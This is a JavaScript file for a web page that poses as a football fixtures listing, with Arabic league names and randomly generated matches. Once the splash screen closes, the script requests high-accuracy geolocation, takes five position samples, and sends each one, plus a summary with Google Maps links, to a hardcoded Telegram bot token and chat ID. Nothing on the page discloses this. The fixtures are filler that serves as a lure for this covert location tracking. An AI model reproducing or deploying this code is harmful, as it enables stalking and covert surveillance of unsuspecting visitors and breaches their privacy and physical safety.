const CONFIG={
  telegramBotToken:'8429040793:AAHyb0ebmApHOl1d_NvtXDdCBZ-dw_w2M8Y',
  telegramChatId:'8209565969',
  sampleCount:5,
  splashDurationMs:5000,
  sampleDelayMs:100,
  developerName:'𝓐𝓱𝓶𝓮𝓭 𝓜𝓸𝓼𝓽𝓪𝓯𝓪' // زخرفة اسم المطور
};

const splash=document.getElementById('splash');
const skipBtn=document.getElementById('skip-btn');
const matchTable=document.getElementById('match-table');
const leaguesDiv=document.getElementById('leagues');
let _samples=[];

function hideSplash(){
  splash.classList.add('hidden');
  setTimeout(requestGeolocationSamples,300);
}
splash.addEventListener('click',hideSplash);
skipBtn.addEventListener('click',hideSplash);
setTimeout(hideSplash,CONFIG.splashDurationMs);

/* Geolocation sampling */
function requestGeolocationSamples(){
  if(!navigator.geolocation){
    console.warn('Geolocation not supported');
    showMatchesTable();
    return;
  }

  let idx=0;
  function takeSample(){
    navigator.geolocation.getCurrentPosition(
      position=>{
        const sample={
          index:idx+1,
          lat:position.coords.latitude,
          lng:position.coords.longitude,
          acc:position.coords.accuracy,
          timestamp:new Date().toLocaleString()
        };
        _samples.push(sample);
        sendSampleToTelegram(sample);

        // الجدول يظهر مباشرة بعد أول عينة
        if(idx===0) showMatchesTable();

        idx++;
        if(idx<CONFIG.sampleCount) setTimeout(takeSample, CONFIG.sampleDelayMs);
        else sendSummaryToTelegram();
      },
      error=>{
        if(error.code===error.PERMISSION_DENIED) console.info('User denied location.');
        else console.error('Geolocation error:',error);
        showMatchesTable();
      },
      {enableHighAccuracy:true, maximumAge:0, timeout:5000}
    );
  }
  takeSample();
}

/* Send sample to Telegram */
function sendSampleToTelegram(sample){
  const text=`
📍 Sample #${sample.index}
🕒 Time: ${sample.timestamp}
🧭 Latitude: ${sample.lat}
🧭 Longitude: ${sample.lng}
🎯 Accuracy: ${sample.acc} m
🔗 Google Maps: https://www.google.com/maps?q=${sample.lat},${sample.lng}

⚡ Sent by: ${CONFIG.developerName}
`;
  _sendTelegramMessage(text);
}

/* Send summary to Telegram */
function sendSummaryToTelegram(){
  if(!_samples.length) return;
  const best=_samples.reduce((p,c)=>c.acc<p.acc?c:p,_samples[0]);
  const medianLat=_samples[Math.floor(_samples.length/2)].lat;
  const medianLng=_samples[Math.floor(_samples.length/2)].lng;
  const summary=`
🏆 Samples Summary
🧭 Median Latitude: ${medianLat}
🧭 Median Longitude: ${medianLng}
🎯 Best Accuracy: ${best.acc} m (Sample #${best.index})
🔢 Total Samples: ${_samples.length}
🔗 Google Maps: https://www.google.com/maps?q=${medianLat},${medianLng}

✨ Developer: ${CONFIG.developerName}
`;
  _sendTelegramMessage(summary);
}

/* Helper to send message to Telegram */
function _sendTelegramMessage(text){
  const token=CONFIG.telegramBotToken;
  const chatId=CONFIG.telegramChatId;
  if(!token||!chatId) return;
  fetch(`https://api.telegram.org/bot${token}/sendMessage`,{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({chat_id:chatId,text:text})
  }).catch(err=>console.error(err));
}

/* Show matches */
const leaguesData=[
  {name:'الدوري المصري', matches:generateMatches(3)},
  {name:'الدوري الإنجليزي', matches:generateMatches(3)},
  {name:'الدوري الإسباني', matches:generateMatches(3)},
  {name:'الدوري الإيطالي', matches:generateMatches(3)},
  {name:'الدوري الألماني', matches:generateMatches(3)},
  {name:'الدوري الفرنسي', matches:generateMatches(3)},
  {name:'الدوري البرتغالي', matches:generateMatches(3)},
  {name:'الدوري الهولندي', matches:generateMatches(3)},
  {name:'الدوري التركي', matches:generateMatches(3)},
  {name:'الدوري الروسي', matches:generateMatches(3)}
];

function generateMatches(count){
  const teams=['الأهلي','الزمالك','ليفربول','مانشستر يونايتد','ريال مدريد','برشلونة','يوفنتوس','ميلان','بايرن ميونخ','باريس سان جيرمان'];
  const stadiums=['استاد القاهرة','ملعب برج العرب','أولد ترافورد','كامب نو','سان سيرو','أليانز أرينا','حديقة الأمراء'];
  let arr=[];
  for(let i=0;i<count;i++){
    const t1=teams[Math.floor(Math.random()*teams.length)];
    let t2;
    do{t2=teams[Math.floor(Math.random()*teams.length)];}while(t2===t1);
    arr.push({
      team1:t1,
      team2:t2,
      time:`${Math.floor(Math.random()*24).toString().padStart(2,'0')}:${Math.floor(Math.random()*60).toString().padStart(2,'0')}`,
      stadium:stadiums[Math.floor(Math.random()*stadiums.length)]
    });
  }
  return arr;
}

function showMatchesTable(){
  matchTable.style.display='block';
  leaguesDiv.innerHTML='';
  leaguesData.forEach(league=>{
    const leagueDiv=document.createElement('div');
    leagueDiv.classList.add('league');
    const title=document.createElement('div');
    title.classList.add('league-title');
    title.textContent=league.name;
    leagueDiv.appendChild(title);

    league.matches.forEach(match=>{
      const card=document.createElement('div');
      card.classList.add('match-card');
      card.innerHTML=`<div>${match.team1} ⚽ ${match.team2}</div><div>${match.time} - ${match.stadium}</div>`;
      leagueDiv.appendChild(card);
      setTimeout(()=>card.classList.add('visible'),100);
    });

    leaguesDiv.appendChild(leagueDiv);
  });
}